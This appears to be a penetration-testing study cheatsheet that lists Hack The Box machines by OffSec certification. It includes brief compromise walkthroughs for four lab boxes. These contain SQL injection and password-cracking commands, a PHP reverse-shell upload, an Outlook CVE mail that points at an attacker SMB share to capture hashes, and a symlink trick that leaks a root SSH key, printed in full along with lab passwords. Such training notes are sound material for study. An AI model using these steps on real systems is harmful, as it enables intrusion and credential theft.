https://0xdf.gitlab.io/cheatsheets/offsec


OSCPv3 (PEN-200 2023-2024; includes OSCP+)
OSCP Like


## HTB: Editorial 19 Oct 2024
```
1. Pwn 2024-12-11 
2. SSRF:
	Set /etc/hosts of the domain to visit the site
	test GET attacker listening nc
	find local open port and api (by brup or self python scanner)
	leak pass from the api request -> one user without sudo
3. GIT: 
	history, credential leak -> another user with sudo: python3 {a .py with git-python vuln} {param}
4. Git-python vuln:
	https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
	exploit -> root
```

## HTB: BoardLight 28 Sep 2024
```serverfun2$2023!!
1. fuzz host
  Fuzz header Host, and filter out response length 15949.
  cmd: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
2. default password login
3. exploit https://nvd.nist.gov/vuln/detail/CVE-2023-30253 manually, create PHP reverse shell.
4. goto website conf file: htdocs/conf/conf.php
5. find the user in /etc/passwd who has bash, then login by pass found in conf.php
6. Run LinPEAS.sh found suid enlightenment
7. find its version by cmd: enlightenment --version, which vuln to CVE-2022-37706
8. use exploit at: https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh and get root.

```

## HTB: Mailing 07 Sep 2024 (a buggy box)
```
inner network email phishing
1. Windows relative path traverse: "..\..\Windows\System32\drivers\etc\hosts" (not like linux: ../../etc/hosts)
2. google service config path: ..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini. download it
3. cmd: hashcat -m 0 ./md5-hash.txt /usr/share/wordlists/rockyou.txt (md5-hash.txt contains one line of the hashed pass found in .ini file)
4. a Google search for recent vulnerabilities related to Windows Mail -> CVE-2024-21413
5. git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability 
6. TCP port 587 is the default port for sending outgoing emails using the Simple Mail Transfer Protocol (SMTP)
7. As found "Maya Bendito" on webpage, guess a user with email address maya@mailing.htb
8. start smb server on attacker machine: $ impacket-smbserver smbFolder $(pwd) -smb2support
9. Send CVE mail to user maya@mailing.htb, cmd: $ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\YOUR_IP\smbFolder\test.txt" --subject Test
10. save captured pass in a file hast.txt
11. cmd: john -w=/usr/share/wordlists/rockyou.txt hash.txt
12. login as user maya, cmd:  evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
13. exploit https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/ to get root.
```

## HTB: Usage 10 Aug 2024
```
1. fuzz subdomain by cmd: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://usage.htb/ -H 'Host: FUZZ.usage.htb' -fs 178. find admin.usage.htb
2. find SQL injection point at password reset page.
3. copy the POST request and save it in a file called reset.req
4. run sqlmap cmd: sqlmap -r reset.req -p email --batch (shows need higher level)
5. user highrer level of sqlmap: sqlmap -r reset.req -p email --batch --level 3 (shows vulnerable to boolean-based blind and time-based blind)
6. get a list of the available databases using the --dbs flag: sqlmap -r reset.req -p email --batch --level 3 --dbs
	(faster by --threads= flag)   (get 3 dbs, one is "usage_blog")
7. enumerate tables in database "usage_blog": sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10
	(got 15 tables, one is "admin_users")
8. Dump the "admin_users" table: sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
	(got: | 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |)
9. save "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" to hash.txt
10. Crack it using john: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
11. exploit: https://flyd.uk/post/cve-2023-24249/
	(create php reverse shell, reverse.php, rename to reverse,jpg, burp intercept the upload, change name to reverse.php)
	(ref: https://www.revshells.com/)
12. get reverse shell of user: dash.
13. list opening ports: ss -tlpn
    list processes: ps -aux
    check file system table: cat /etc/fstab
	(find interesting process /usr/bin/monit)
14. run cmd: find / -name monit.service 2>/dev/null
15. find user "xander" pass in ~/.monitrc
16. sudo -l, find user can run elf /usr/bin/usage_management by root.
17. run it with sudo, the elf can:
	(1. bakup file to /var/backups/project.zip)
	(2. backup mysql to /var/backups/mysql_backup.sql)
	(3. Reset admin password)
18. static analysis of usage_management, found it uses:
	/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
	/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
	strings: chdir, /var/www/html (guess it will chdir to html folder and compress)
19. The @id_rsa file (also referred to as a listfile) tells 7zip that id_rsa contains a list of files to be compressed.
20. xander@usage:/var/www/html$ touch @id_rsa
21. xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
22. the usage_management will try to archieve each line in id_rsa as a file, the error message will leak the private key:
	-----BEGIN OPENSSH PRIVATE KEY----- : No more files
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
	-----END OPENSSH PRIVATE KEY----- : No more files
23. copy the content to file "id_rsa123" on attacking machine. (remove error log " : No more files")
24. log in to machine: ssh -i ./root-rsa root@usage.htb
```


## HTB: Monitored 11 May 2024

## HTB: Manager 16 Mar 2024

## HTB: CozyHosting 02 Mar 2024

## HTB: Builder 12 Feb 2024

## HTB: Keeper 10 Feb 2024

## HTB: Sau 06 Jan 2024

## HTB: Broker 09 Nov 2023

## HTB: Intentions 14 Oct 2023

## HTB: Aero 28 Sep 2023

## HTB: Busqueda 12 Aug 2023

## HTB: Escape 17 Jun 2023

## HTB: Soccer 10 Jun 2023

## HTB: Flight 06 May 2023

## HTB: UpDown 21 Jan 2023

## HTB: Support 17 Dec 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Pandora 21 May 2022

## HTB: Return 05 May 2022

## HTB: Jeeves 14 Apr 2022

## HTB: Intelligence 27 Nov 2021

## HTB: Blackfield 03 Oct 2020

## HTB: Magic 22 Aug 2020

## HTB: Cascade 25 Jul 2020

## HTB: Sauna 18 Jul 2020

## HTB: ServMon 20 Jun 2020

## HTB: Monteverde 13 Jun 2020

## HTB: Forest 21 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Help 08 Jun 2019

## HTB: Access 02 Mar 2019

## HTB: Active 08 Dec 2018
OSCP Harder

## HTB: Mailing 07 Sep 2024

## HTB: Rebound 30 Mar 2024

## HTB: Clicker 27 Jan 2024

## HTB: Authority 09 Dec 2023

## HTB: Aero 28 Sep 2023

## HTB: Cerberus 29 Jul 2023

## HTB: Absolute 27 May 2023

## HTB: Mentor 11 Mar 2023

## HTB: Outdated 10 Dec 2022

## HTB: Atom 10 Jul 2021

## HTB: Cereal 29 May 2021

## HTB: APT 10 Apr 2021

## HTB: Multimaster 19 Sep 2020

## HTB: Quick 29 Aug 2020

OSCPv2 (PEN-200 2022)
OSCP Like

## HTB: Support 17 Dec 2022

## HTB: Scrambled 01 Oct 2022

## HTB: Seventeen 24 Sep 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Talkative 27 Aug 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Acute 16 Jul 2022

## HTB: Paper 18 Jun 2022

## HTB: Meta 11 Jun 2022

## HTB: Pandora 21 May 2022

## HTB: Mirai 18 May 2022

## HTB: Shibboleth 02 Apr 2022

## HTB: Object 28 Feb 2022

## HTB: Horizontall 05 Feb 2022

## HTB: Forge 22 Jan 2022

## HTB: Previse 08 Jan 2022

## HTB: Writer 11 Dec 2021

## HTB: Intelligence 27 Nov 2021

## HTB: Seal 13 Nov 2021

## HTB: Pit 25 Sep 2021

## HTB: Knife 28 Aug 2021

## HTB: Love 07 Aug 2021

## HTB: Armageddon 24 Jul 2021

## HTB: Ophiuchi 03 Jul 2021

## HTB: Node 08 Jun 2021

## HTB: ScriptKiddie 05 Jun 2021

## HTB: Delivery 22 May 2021

## HTB: Ready 15 May 2021

## HTB: Blue 11 May 2021

## HTB: APT 10 Apr 2021

## HTB: Time 03 Apr 2021

## HTB: Luanne 27 Mar 2021

## HTB: Sense 11 Mar 2021

## HTB: Passage 06 Mar 2021

## HTB: Doctor 06 Feb 2021

## HTB: Worker 30 Jan 2021

## HTB: Omni 09 Jan 2021

## HTB: SneakyMailer 28 Nov 2020

## HTB: Buff 21 Nov 2020

## HTB: Tabby 07 Nov 2020

## HTB: Fuse 31 Oct 2020

## HTB: Blunder 17 Oct 2020

## HTB: Admirer 26 Sep 2020

## HTB: Haircut 10 Sep 2020

## HTB: Remote 05 Sep 2020

## HTB: Magic 22 Aug 2020

## HTB: Blocky 30 Jun 2020

## HTB: Popcorn 23 Jun 2020

## HTB: ServMon 20 Jun 2020

## HTB: OpenAdmin 02 May 2020

## HTB: SolidState 30 Apr 2020

## HTB: Mango 18 Apr 2020

## HTB: Traverxec 11 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Postman 14 Mar 2020

## HTB: Bankrobber 07 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Jarvis 09 Nov 2019

## HTB: SwagShop 28 Sep 2019

## HTB: Bastion 07 Sep 2019

## HTB: FriendZone 13 Jul 2019

## HTB: Conceal 18 May 2019

## HTB: Irked 27 Apr 2019

## HTB: Frolic 23 Mar 2019

## HTB: SecNotes 19 Jan 2019

## HTB: Active 08 Dec 2018

## HTB: Jerry 17 Nov 2018

## HTB: Bounty 27 Oct 2018

## HTB: TartarSauce 20 Oct 2018

## HTB: Sunday 29 Sep 2018

## HTB: Poison 08 Sep 2018

## HTB: Valentine 28 Jul 2018

## HTB: Nibbles 30 Jun 2018

## HTB: Chatterbox 18 Jun 2018
OSCP Harder

## HTB: Undetected 02 Jul 2022

## HTB: Jail 23 May 2022

## HTB: Search 30 Apr 2022

## HTB: Backdoor 23 Apr 2022

## HTB: Stacked 19 Mar 2022

## HTB: Forge 22 Jan 2022

## HTB: Writer 11 Dec 2021

## HTB: Pikaboo 04 Dec 2021

## HTB: PivotAPI 06 Nov 2021

## HTB: Dynstr 16 Oct 2021

## HTB: Monitors 09 Oct 2021

## HTB: Breadcrumbs 17 Jul 2021

## HTB: Atom 10 Jul 2021

## HTB: APT 10 Apr 2021

## HTB: Blackfield 03 Oct 2020

## HTB: Quick 29 Aug 2020

## HTB: Cascade 25 Jul 2020

## HTB: Sauna 18 Jul 2020

## HTB: Book 11 Jul 2020

## HTB: Monteverde 13 Jun 2020

## HTB: Nest 06 Jun 2020

## HTB: Control 25 Apr 2020

## HTB: Mango 18 Apr 2020

## HTB: Sniper 28 Mar 2020

## HTB: Bitlab 11 Jan 2020

## HTB: Safe 26 Oct 2019

## HTB: LaCasaDePapel 27 Jul 2019

## HTB: Netmon 29 Jun 2019

## HTB: Querier 22 Jun 2019

## HTB: Sizzle 01 Jun 2019

## HTB: Lightweight 11 May 2019

## HTB: October 26 Mar 2019

OSCPv1 (Original Release)
OSCP Like

## HTB: Brainfuck 16 May 2022

## HTB: Node 08 Jun 2021

## HTB: Shocker 25 May 2021

## HTB: Blue 11 May 2021

## HTB: Optimum 17 Mar 2021

## HTB: Sense 11 Mar 2021

## HTB: Beep 23 Feb 2021

## HTB: Buff 21 Nov 2020

## HTB: ServMon 20 Jun 2020

## HTB: Grandpa 28 May 2020

## HTB: Arctic 19 May 2020

## HTB: SolidState 30 Apr 2020

## HTB: Nineveh 22 Apr 2020

## HTB: Cronos 14 Apr 2020

## HTB: Lame 07 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Bankrobber 07 Mar 2020

## HTB: Networked 16 Nov 2019

## HTB: Jarvis 09 Nov 2019

## HTB: SwagShop 28 Sep 2019

## HTB: Bastion 07 Sep 2019

## HTB: FriendZone 13 Jul 2019

## HTB: Conceal 18 May 2019

## HTB: Irked 27 Apr 2019

## HTB: Bastard 12 Mar 2019

## HTB: Granny 06 Mar 2019

## HTB: Devel 05 Mar 2019

## HTB: Legacy 21 Feb 2019

## HTB: SecNotes 19 Jan 2019

## HTB: Active 08 Dec 2018

## HTB: Jerry 17 Nov 2018

## HTB: Bounty 27 Oct 2018

## HTB: TartarSauce 20 Oct 2018

## HTB: Sunday 29 Sep 2018

## HTB: Poison 08 Sep 2018

## HTB: Silo 04 Aug 2018

## HTB: Valentine 28 Jul 2018

## HTB: Nibbles 30 Jun 2018

## HTB: Chatterbox 18 Jun 2018

## HTB: Bashed 29 Apr 2018
OSCP Harder

## HTB: Jail 23 May 2022

## HTB: Jeeves 14 Apr 2022

## HTB: Tally 11 Apr 2022

## HTB: Kotarak 19 May 2021

## HTB: Control 25 Apr 2020

## HTB: Sniper 28 Mar 2020

## HTB: Bitlab 11 Jan 2020

## HTB: Safe 26 Oct 2019

## HTB: LaCasaDePapel 27 Jul 2019

## HTB: Netmon 29 Jun 2019

## HTB: Sizzle 01 Jun 2019

## HTB: Lightweight 11 May 2019

## HTB: October 26 Mar 2019

## HTB: Hawk 30 Nov 2018

## HTB: Bart 15 Jul 2018

## HTB: Falafel 23 Jun 2018

OSEP (PEN-300)
OSEP Like

## HTB: Escape 17 Jun 2023

## HTB: Absolute 27 May 2023

## HTB: Flight 06 May 2023

## HTB: Sekhmet 01 Apr 2023

## HTB: Support 17 Dec 2022

## HTB: Outdated 10 Dec 2022

## HTB: Hathor 19 Nov 2022

## HTB: Scrambled 01 Oct 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Forge 22 Jan 2022

## HTB: Seal 13 Nov 2021

## HTB: APT 10 Apr 2021

## HTB: Multimaster 19 Sep 2020

## HTB: Magic 22 Aug 2020

## HTB: Monteverde 13 Jun 2020

## HTB: OpenAdmin 02 May 2020

## HTB: Control 25 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Querier 22 Jun 2019
OSEP Harder

## HTB: Absolute 27 May 2023

## HTB: Search 30 Apr 2022

## HTB: Anubis 29 Jan 2022

## HTB: PivotAPI 06 Nov 2021

## HTB: Monteverde 13 Jun 2020

## HTB: Sizzle 01 Jun 2019

OSWE (WEB-300)
OSWE Like

## HTB: Fingerprint 14 May 2022

## HTB: Fulcrum 11 May 2022

## HTB: Stacked 19 Mar 2022

## HTB: Monitors 09 Oct 2021

## HTB: Sink 18 Sep 2021

## HTB: Schooled 11 Sep 2021

## HTB: Unobtainium 04 Sep 2021

## HTB: Cereal 29 May 2021

## HTB: CrossFit 20 Mar 2021

## HTB: Magic 22 Aug 2020

## HTB: Blocky 30 Jun 2020

## HTB: Popcorn 23 Jun 2020

## HTB: Mango 18 Apr 2020

## HTB: Json 15 Feb 2020

## HTB: Unattended 24 Aug 2019

## HTB: Help 08 Jun 2019

## HTB: Vault 06 Apr 2019

## HTB: Zipper 23 Feb 2019

## HTB: Celestial 25 Aug 2018

## HTB: Falafel 23 Jun 2018
OSWE Harder

## HTB: Holiday 11 Sep 2019

## HTB: Arkham 10 Aug 2019

## HTB: Hackback 06 Jul 2019
